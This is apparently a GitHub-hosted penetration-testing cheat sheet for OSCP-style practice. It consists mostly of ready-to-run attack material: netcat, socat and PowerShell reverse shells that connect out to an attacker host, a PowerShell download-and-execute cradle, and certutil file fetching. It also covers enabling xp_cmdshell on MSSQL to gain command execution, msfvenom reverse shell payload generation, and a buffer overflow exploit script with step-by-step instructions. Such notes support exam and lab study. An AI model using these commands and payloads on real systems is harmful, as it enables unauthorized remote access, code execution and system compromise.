# Reference
General stuff that people overlook to use 

Skip to content
Pull requests
Issues
Marketplace
Explore
@pyro0ownz
pyro0ownz /
Reference
Public

Code
Issues
Pull requests
Actions
Projects
Wiki
Security
Insights

    Settings

Reference/References
@pyro0ownz
pyro0ownz Create References
Latest commit c66e452 20 seconds ago
History
1 contributor
216 lines (153 sloc) 6.74 KB
<h1>####################General Reference list (Incomplete) ###################</h1>
            <h4>######I will add to this more as have more time#######</h4>

<h3>#search for public exploits</h3> 

<p>Searchsploit
Google
github</p>

<h3>#Serve content<h3/>
 
<p>python3 -m http.server 80
 python2 -m SimpleHTTPServer 80</p>
 
<h3>#Linux download commands</h3> 
<p>wget 
curl
w3m
elinks</p>

<h3>#windows download commands</h3>
<p>certutil.exe -urlcache -f http://serverip/port</p>

<h3>#spawn tty shells</h3>

<p>python -c 'import pty; pty.spawn("/bin/sh")'
python -c 'import pty; pty.spawn("/bin/bash")'
echo os.system('/bin/bash')
/bin/sh -i
perl —e 'exec "/bin/sh";'
perl: exec "/bin/sh";
ruby: exec "/bin/sh"
lua: os.execute('/bin/sh')
exec "/bin/sh"
in vi editor - :!bash 
in vi editor - :set shell=/bin/bash:shell
in nmap - !sh
socat file:`tty`,raw,echo=0 tcp-listen:666
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:xxx.xxx.xxx.xxx:666
nc -lnvp 666 #listener
nc ip port –e /bin/bash #reverse shell netcat needs to be upgraded with above shells. </p>

<h3>#Linux permission search</h>
<p>find /usr/bin/ -perm -u=s # set uids 

find / -writable -type d 2>/dev/null # world-writeable folders
find / -perm -777 -type d 2>/dev/null # world-writeable folders

find / -perm -o w -type d 2>/dev/null # world-writeable folders

find / -perm -o x -type d 2>/dev/null # world-executable folders

find / \( -perm -o w -perm -o x \) -type d 2>/dev/null # world-writeable & executable folder</p>


<h3>#communicate with msssql</h3>

<p>#basic mysql stuff to login and database 
mysql -u <username> -p <password;
show databases;
use <table>;
show tables;
select * from <table>;

sqsh

xpcmdshell #is what you want to use in mssql with sqsh to get a command shell. If you dont have permission and its misconfigured, this is how you get a shell in sql. 
1> xp_cmdshell 'whoami';
2> go
Msg 15281, Level 16, State 1 error so we enable since we are sa account

1> EXEC sp_configure 'show advanced options', 1;
2> go
Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE
statement to install.
(return status = 0)
1> RECONFIGURE; 
2> go
1> EXEC sp_configure 'xp_cmdshell', 1;
2> go
Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to
install.
(return status = 0)
1> RECONFIGURE;
2> go

1> xp_cmdshell 'whoami';
2> go
</p>

<h3>#windows powershell Reverse shell and powershell command to download and run as soon as its done downloading the file and to run the function in it.</h3>

<p>powershell.exe','-NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "&{$client = New-Object System.Net.Sockets.TCPClient(\"iptoconnectto\",port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"^> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"'
powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('http://server:port/powershellfile.ps1'));Invoke-functiontocallfromyourps1"</p>



<h3>###########MSF venom###########</h3>
<p>#Format
msfvenom -p <payload> -f <ext> LHOST=<ip> LPORT=<port>

#Always check payload type!!
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=4444 -f exe -o shell.exe

#ALWAYS USE STAGELESS PAYLOADS FOR NC REVERSE SHELL

if !(shell_return){ #if no shell returns arch problem else if shell died payload problem
	arch problem;
elseif (shell_died_instantly)){
	payload problem;
	}	
}

#Staged payload = split into 2 areas, 1st to initiate connection, rest to send actual payload ==> reverse_tcp
#Stageless payload = all in one, suitable for nc listeners bcx it is stable ==> shell_reverse_tcp

msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.95 LPORT=80 -f exe -o shell.exe </p>



<h3>#######################Buffer Overflow section##################</h3>
<p>When you have a server or program that is on your network, and it is vulnerable to buffer overflow bad things happen. 

https://steflan-security.com/complete-guide-to-stack-buffer-overflow-oscp/

#!/usr/bin/python
import socket
import time
import sys
badchars = ("")
filler = "Z" * xxx
eip =  "\x00\x00\x00\x00" 
offset = "x" * xxx
end = "\r\n" #return or enter if needed 
nops = "\x90" * 10

try:
    print "\nThis is my boom stick!"

    inputbuffer = filler
    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.0.0", 666))
    s.send(inputbuffer)
    s.close()
    print "derka derka" 

except:
    print "\nSomething Went wrong"
    sys.exit()


find open port and ip 
send string until eip is overflown 
send pattern from msf-pattern_create
send pattern from msf and check offset 
gain control of eip and look for jump in assembly instructions from monamodules (make sure protections arent on in the thingy you find)
find the address for jump and stick in eip 
generate shell code and launch 

msf-pattern_create -l 
msf-pattern_offset -l -q 
!mona modules 
!mona find -s "\x00\x00" -m module </p>

<h3>#######################Links and other section####################</h3>

<p>Tools 
https://github.com/codingo/Reconnoitre

Upgrading shells
https://netsec.ws/?p=337



https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
https://netsec.ws/?p=337

https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/

JSON token
https://medium.com/dev-bits/a-guide-for-adding-jwt-token-based-authentication-to-your-single-page-nodejs-applications-c403f7cf04f4

https://recipeforroot.com/


Window privesc:-
http://www.fuzzysecurity.com/tutorials/16.html
https://github.com/abatchy17/WindowsExploits
https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html

https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc     <<warning may have automated exploitation in it.
https://www.roguesecurity.in/2018/12/02/a-guide-for-windows-penetration-testing/
https://xapax.gitbooks.io/security/content/privilege_escalation_windows.html


IMPORTANT****
snapd
https://github.com/initstring/dirty_sock

Breaking restrected shells
https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells </p>


<h3>#####Tools you can use If your doing oscp######</h3>
<p>SUID3NUM 
winpeas 
linpeas < 2.7.0 
lse.sh (google it) 
nmapautomator #If you want automation because it only scans one host i made a suppliment script (https://github.com/pyro0ownz/nmapAutomator)
AutoRecon </p>


<p><b>More to come when i can gather my thoughts and play with some more stuff. Wish you luck and hope this helps!</b></p>

 

    © 2021 GitHub, Inc.

    Terms
    Privacy
    Security
    Status
    Docs
    Contact GitHub
    Pricing
    API
    Training
    Blog
    About

Loading complete
